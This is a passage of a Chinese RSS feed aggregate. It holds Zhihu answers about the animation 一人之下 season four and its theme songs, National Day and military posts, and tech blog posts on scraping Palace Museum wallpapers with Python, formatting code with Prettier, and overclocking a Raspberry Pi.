本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69082"},{"title":"国产动画《一人之下》第四季开播，你感觉如何？","date":"2021-10-01 10:39:08","description":"\n<p> 1、和大家分享一下看到第四季动画时的心情。</p>\n<p>感谢知乎邀请，刚看完前两集，很开心，第四季终于上线了。当初看到预告片的时候就觉得很惊艳了。漫画很多没做细致的部分这次动画都丰富了。听说还去了六盘水取材。</p>\n<p><br></p>\n<p>2、对《一人之下4》出场的角色塑造满意吗？</p>\n<p>角色的刻画很棒。给王震球加的滑板很适合这货。几个临时工的配音也很有意思，二壮还有男版的伪装音，这个构思很巧。</p>\n<p><br></p>\n<p>3、最期待在动画里看到的剧情是哪段？</p>\n<p>第四季估计大家期待的场面有很多。。我自己么。。除了七人同框的场景外，最期待的就是诸葛大夫治病的剧情了。</p>\n<p><br></p>\n<p>4、在您看来，《一人之下》动画化的这5年，最大的感受和变化是什么？</p>\n<p>最大的感受就是动画行业也够累的。而且和漫画不同，漫画制作的人员组成比较简单，动画团队要大得多，除了制作本身，方方面面各种事情都要操心。</p>\n<p><br></p>\n<p>5、分享一下想对动画制作团队说的话。</p>\n<p>感谢这次启缘映画陈导和他的团队。这两年赶上疫情，听说为了动画制作不出叉子，团队一直封闭在一起，辛苦了。期待启缘接下来更多的作品。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/488660280/answer/2149822565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488660280/answer/2149822565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">321 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/468563690?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》八奇技中的神机百炼？</a><br><a href=\"http://www.zhihu.com/question/399121262?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《一人之下》老天师杀那么多全性最终目的是不是为了保护张楚岚？</a><br>\n","link":"http://www.zhihu.com/question/488660280/answer/2149822565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"成为一名飞行员需要哪些技能？","date":"2021-10-01 09:07:20","description":"【海军2022年招飞宣传片《海选》正式上线 片尾彩蛋！】天高海阔，茫茫人海，你想不想成为被“飞鲨”选中的人？驾驶战鹰，驰骋海天！在祖国需要的时候挺身而出！飞天巡海，卫我中华！欢迎加入海军航空兵！（编/海叔）\n\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ren-min-hai-jun-74?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">人民海军</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489932703/answer/2149690020?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">4 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/64477906?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">刚入职的飞行员有什么加分的技能么？</a><br><a href=\"http://www.zhihu.com/question/268608922?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">哪项飞行技能最考验飞行员技术？</a><br>\n","link":"http://www.zhihu.com/question/489932703/answer/2149690020?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国庆节去天安门广场看升旗仪式是一种什么体验？","date":"2021-10-01 04:35:43","description":"\n<p>作为现役的时候偶尔去执勤的其中一员，每逢大的节日会的，只不过注意点还真不在看升旗上，更多的是拉出警戒线，防止人员踩踏或者其他的意外情况。</p>\n<a href=\"https://www.zhihu.com/video/1427241273585971200\"></a><p>有几年还特别幸运，被安排在花篮的正北方，甬道的两旁，这个为止算是观旗最佳的地点了。</p>\n<p>想去观看升旗仪式的话，肯定在时间上越早越好，但是晚上广场是封闭的，太早的话是进不去的。所以最佳的时间应该在零点前后到达，在多个方向都能进入。</p>\n<p>最好是公交加步行的方式来比较好，打车也要远远的停车，不然周边真没啥地方停车。</p>\n<p>位置没啥好坏，因为除了前排其他的还真看不到什么，更多的是感受一下氛围。</p>\n<p>带好身份证，这个是重点，安检的时候是需要查验的。</p>\n<p>晚上气温还是比较低的，而且等候时间太长，最好带着厚一点的衣服。简易的坐垫带上不丢人。</p>\n<p>手机充满电，毕竟大多数人是需要拍照的。</p>\n<p>广场放人的时候是分格逐步放的，各区域都有警察武警的警戒线，一个区域人满了之后就开始放下一个。</p>\n<p>手机打字太麻烦了，以后慢慢更新！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/li-yong-bin-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">煎饼卷带鱼</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485008530/answer/2149386954?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">880 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/59133643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">打算国庆节去北京天安门看升旗仪式，有什么好的建议？</a><br><a href=\"http://www.zhihu.com/question/54147926?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想元旦去天安门广场看升旗？</a><br>\n","link":"http://www.zhihu.com/question/485008530/answer/2149386954?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"哪些照片或视频，记录了你和祖国共同成长的故事？","date":"2021-10-01 04:13:47","description":"\n<p>【我爱你，中国！】</p>\n<p>这个国庆节，中部战区官兵在战位祝祖国繁荣昌盛，祝人民幸福安康！强军有我，请放心！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-bu-zhan-qu-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中部号角</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489322223/answer/2149374990?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">342 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/487164298?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有一些照片或视频，让你感到「祖国越来越强大」了？</a><br><a href=\"http://www.zhihu.com/question/20112482?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在哪裡可以找到中國的老照片？</a><br>\n","link":"http://www.zhihu.com/question/489322223/answer/2149374990?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国庆期间，你都在哪些地方看到过军人的身影？有什么话想对他们说？","date":"2021-10-01 04:00:37","description":"\n<p></p>\n<a href=\"https://www.zhihu.com/video/1427229067020398592\">唱给祖国的歌</a><p>国庆之际，解放军和武警部队官兵枕戈待旦坚守战位，执勤巡逻保卫国家安全和人民美好生活！</p>\n<p>（视频来源：新华军事）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-jun-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国军网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489246681/answer/2149316122?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">30 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/446492600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">军人的元宵节是怎么过的？部队在这天会干点儿啥？</a><br><a href=\"http://www.zhihu.com/question/311474040?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">部队春节出任务吗？</a><br>\n","link":"http://www.zhihu.com/question/489246681/answer/2149316122?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《一人之下》第四季的片头曲和片尾曲？","date":"2021-10-01 01:19:02","description":"\n<p>知乎的朋友们好！我是《一人之下4》和《一人之下3》的音乐和音响监制潇娘，最近一人4上线了2集看到了很多朋友对音乐的讨论，在这里想分享下一人4音乐的创作过程。</p>\n<p><br></p>\n<p>一、片头曲《无念无生》写的是临时工群像。</p>\n<p><br></p>\n<p>《无念无生》开头采用了《一人之下》动画一贯且独有的特色开头——贵州粗犷悠远的山歌唱腔，中间歌曲主题采用了特立独行的djent金属，而结尾短短两句山歌则是对第二季四川民歌的call back，表示剧情经过第三季的插入式剧情段落后又回到了主线，同时也是对同样导了第二季的陈烨导演的回归而致敬。</p>\n<p>歌曲以既具爆发力又笼罩着压抑深沉情绪的嗓音和不断奔涌前进式的金属风格体现了《一人之下》中“临时工”这个特殊的群像——肖哥，黑管，球儿他们几个人虽然性格各异难以概述，但他们是确确实实的一批幕后英雄，饱含一腔热血，但所做所为却不可为人知。因此这首曲子处理成了较为深沉压抑、绝不回头的冷峻气质。</p>\n<p><br></p>\n<p>二、片尾曲《碧游欢迎你》是写如花的歌，也是第四季碧游村篇章的一则印象小品。</p>\n<p><br></p>\n<p>《碧游欢迎你》是一首少见的融合了多钟西南少数民族音乐元素的trap风格歌曲。歌曲开头初始分别引入了川剧和京剧唱腔，然后逐渐被浮出水面的的侗族大歌女领唱的声音取代——这个富有深意的处理动机意为动画前三季的四川民歌元素、京味音乐元素即刻被第四季的贵州少数民族音乐元素所取代，也意味着第四季主线剧情王者归来。进入主歌前的邪魅一笑“哈哈哈~”预示着可能你所听到的歌曲并非你在歌词所见的那样……</p>\n<p>歌曲主歌部分为诡魅又阴沉的女声，而后我们实录的侗族大歌的人声合唱元素也被处理成一唱一和的形式作为背景人声融合在了歌曲的后方，这些有趣的人声搭配上trap的强烈鼓点，仿佛就是神秘的碧游村正在忽悠主角们前来了，还挺霸道难缠，带着点勺子杀人狂的韧性感……。在进副歌之前则加入了一小段侗族乐器“牛腿琴”循环往复的粗糙拉奏，原始而洗脑。歌曲的副歌以高亢并带有侵略性的贵州话山歌能让人打起激灵~ 歌词却是机械化而略带年代感的迎宾语，吹嘘村长的废话马屁 —— 总之一切显得似乎过于热情了，不禁让人想知道进来这个村子会发生什么有趣（或不幸）的事情呢哈哈哈，作词超坏的。</p>\n<p>值得一提的是，该首歌曲基本复刻了第三季的特别片尾曲《王道长可能会摔手机》的段落构成方式，这个点细心的朋友可以从副歌的最后一段重复段落里色彩丰富的爵士和声中可以感受到作曲的设计。《王道长可能会摔手机》和《碧游欢迎你》一个是以碧游村的村长“马仙洪”的感情充沛吸引主角前来，一个是以马村长的人形狗腿“如花”们的热情迎接吸引主角们前来。《一人之下4》的片尾曲继《幺妹儿冯宝宝》《心猿归正》的好评后一如既往、喜闻乐见地处理得比较有趣和深度民俗化。</p>\n<p><br></p>\n<p>三、关于片头片尾曲的考虑</p>\n<p><br></p>\n<p>诚然，第四季的故事背景是在西南贵州一片。片尾歌曲中出现的的侗族大歌、牛腿琴等音乐元素是我们在2020年秋天去贵州东南宰荡村侗寨进行的实录取材。当时的音乐采风之旅录了长达十几个小时时长的音视频素材，包括了大量的西南少数民族音乐，比如苗族的芦笙，也get了一些有趣的知识：侗寨多在山下依水而居，苗寨多在山顶因险而建，同一片山头能扎着几个不同民族的寨子，大家往来颇多。当时也是取材完了山沟里侗寨的大歌后侗族村长朋友指引我上了旁边的山头去听苗族的芦笙歌舞。少数民族之间的文化交流和走动尚且如此开放，我们在ED制作上除了一贯的趣味性，也更应该去拥抱去尝试更多融合性和开放性的想法进来。关于片尾曲为何如此“上头”，可能确实和我们花了很多时间去思考融合性有关系吧~</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5fc8f7bfaf2c9decbaa58235f6a19097_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>（图为牛腿琴乐手和休息中的侗族姐姐，寨子里的年轻人已经越来越少了）</p>\n<p>相对应的，片头曲的方向我们在设计初期也是按照惯例去写了山歌，也确实做出来了几个还很不错的版本。但随着动画制作的推进，我越发认为这首歌作为全季的OP应该更有概括性和统一性，过多的元素我担心会和本季聚焦的临时工剧情、本次导演的画面表演相撞，所以这次没有往一味追求燃的方向走，除了开头结尾外也没有过多融合民歌元素，而是在歌曲主题阶段选择了单一不花哨的金属风格，贴合了临时工群体纯粹、不回头的感觉。而之前为OP所准备的一些少数民族音乐取材元素，通通留给了ED和bgm。</p>\n<p>OP信息传达的任务会比ED重。这一季剧情确实也一直挺压抑的，因此副歌没有过分的做拔高本身也是为了契合临时工这种“幕后战士”的感觉。再一个小考虑是希望这次的旋律能简单上口一些，之前第三季片头曲《出入平安》虽然人气也不错，但因为中间有一段rap导致翻唱率不太高。多重考虑之下，且本季切入点是临时工群像的话，纯粹的山歌确实就有点窄了。本季的音乐是一个整体，我们后面还有多首歌曲，风格和元素都不一样，这个大家放心，请继续期待！（写这段文字的时候还在死磕第三集第四集的最终音响效果……）</p>\n<p>最后，OP《无念无生》、ED《碧游欢迎你》这次我们都制作了杜比全景声版本，不日上线apple music、腾讯视频、B站等平台。这次我们也会发行海外多个音视频平台，尽量让世界各地的动画粉丝朋友都可以loop起来一人之下的歌曲魅力。</p>\n<p><br></p>\n<p>真诚感谢近期大家对两首歌曲的喜欢和批评！</p>\n<p><br></p>\n<p><br></p>\n<p>四、安利</p>\n<p><br></p>\n<p>除了即将陆续登场的多首歌曲外，本次配乐仍然是很大亮点，极其注重氛围感和情绪营造，也有不少民族音乐元素的融入。我们和作曲、音频团队昼夜不舍的打磨都是希望能尽量带给大家电影级的体验。</p>\n<p>另外陈朵角色歌《夜之花》发布啦！这首大气和细腻并存，陈朵的剧情会覆盖较长一段时间，而随着动画剧情的发展可以慢慢去反复感受到词曲的优秀。和阿朵老师的合作是真是十分玄妙的过程，录音当天朵姐为了进入角色，甚至花了很长一段时间静心去和歌曲中一股特殊的“炁”对抗，我们当天都完全被朵姐的唱腔和气质感染到。还没关注到的朋友去QQ音乐酷狗酷我5sing收听吧~ MV也敬请期待！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lubyson-liang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">潇娘</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489030529/answer/2148958668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">16 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/489656094?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《一人之下》第四季的配音？</a><br><a href=\"http://www.zhihu.com/question/490037778?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《一人之下》第四季第三集？</a><br>\n","link":"http://www.zhihu.com/question/489030529/answer/2148958668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure 